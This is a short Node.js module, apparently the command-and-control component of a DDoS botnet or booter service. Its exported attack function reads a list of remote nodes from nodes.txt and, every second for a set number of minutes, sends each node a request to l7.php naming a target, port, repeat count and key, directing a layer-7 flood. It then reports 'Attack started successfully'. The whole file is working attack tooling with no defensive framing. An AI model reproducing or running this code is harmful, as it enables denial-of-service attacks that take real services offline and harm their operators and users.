const fetch = require('node-fetch');
const fs = require('fs');
const memory = {};
module.exports.attack = function (type, repeats, target, port, token, duration){

    switch(type) {
        case 'l7':
            const loop = setInterval(()=> {
                fs.readFile('./nodes.txt', 'utf8', (err, data) => {
                    if (err) {
                        console.error(err);
                        return
                    }
                    let nodes = data.split('\n');
                    nodes.pop();
                    memory.size = nodes.length;
                    nodes.forEach(node => {
                        fetch(`http://${node}/l7.php?repeats=${repeats}&target=${target}&port=${port}&key=${token}`)
                    })
                })
            }, 1000)
            setTimeout(()=>{clearInterval(loop)}, duration * 60 * 1000);
            if(typeof memory.size=='undefined') memory.size = 0;
            let dmessage = {'type': 'ok', 'message': {'title': 'Attack started successfully', 'target': target, 'port': port, 'method': type, 'duration': `${duration} min`, 'repeats': repeats}, 'power': `${memory.size} nodes`};
            console.log(dmessage);
            return dmessage;
            break;
        default:
            return {'type': 'error', 'message': `You must provide valid method. Method ${type} not found`}
    }
}